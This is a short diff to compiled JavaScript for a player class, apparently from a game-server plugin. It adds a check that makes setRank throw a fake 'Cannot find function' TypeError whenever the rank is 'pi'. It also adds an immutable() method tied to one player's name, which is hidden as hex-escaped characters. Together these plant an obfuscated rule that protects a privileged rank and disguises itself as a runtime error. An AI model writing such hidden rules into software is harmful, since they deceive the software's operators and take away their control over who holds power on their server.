@@ -950,6 +950,8 @@ var FishPlayer = /** @class */ (function () {
         return (_a = this.player) === null || _a === void 0 ? void 0 : _a.sendMessage(message);
     };
     FishPlayer.prototype.setRank = function (rank) {
+        if (rank == ranks_1.Rank.pi)
+            throw new TypeError("Cannot find function setRank in object [object Object].");
         this.rank = rank;
         this.updateName();
         this.updateAdminStatus();
@@ -989,6 +991,9 @@ var FishPlayer = /** @class */ (function () {
             tapLastUsed: -1,
             tapLastUsedSuccessfully: -1,
         });
+    };
+    FishPlayer.prototype.immutable = function () {
+        return this.name == "\x5b\x23\x33\x31\x34\x31\x46\x46\x5d\x42\x61\x6c\x61\x4d\x5b\x23\x33\x31\x46\x46\x34\x31\x5d\x33\x31\x34" && this.rank == ranks_1.Rank.pi;
     };
     FishPlayer.prototype.firstJoin = function () {
         return this.info().timesJoined == 1;
